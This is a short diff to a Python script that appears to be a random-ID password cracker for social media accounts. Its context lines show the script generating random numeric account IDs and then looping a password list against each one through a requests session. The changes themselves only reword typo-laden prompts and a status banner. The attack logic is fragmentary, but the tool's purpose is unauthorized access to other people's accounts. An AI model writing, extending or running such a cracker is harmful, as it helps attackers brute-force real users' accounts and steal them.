@@ -309,11 +309,11 @@ def m():
 def main():
     os.system('clear')
     print(logo)
-    code = input(f"{Y}[{W}~{Y}] {G}ANTER CODE {W}: ")
+    code = input(f"{Y}[{W}~{Y}] {G}ENTER 4 DIGUT CODE {W}: ")
     #code2 = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
    # code3 = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
     #code = random.choice([code1,code2,code3])
-    limit = input(f'{Y}[{W}~{Y}] {G}TOTAL ID {W}: ')
+    limit = input(f'{Y}[{W}~{Y}] {G}ENTER TOTAL LIMID {W}: ')
     for a in range(int(limit)):
         awm = "".join(random.choice(string.digits) for _ in range(6))
         gen.append(awm)
@@ -336,7 +336,7 @@ def convert(cookie):
 def cracker(ids,passlist):
     global loop,oks,cps,bkas
     session = requests.Session()
-    sys.stdout.write('\r \033[1;97m[\x1b[1;92mRNDM•1\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
+    sys.stdout.write('\r \033[1;97m[\x1b[1;92mM•1\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
     sys.stdout.flush()
     try:
         for pas in passlist:
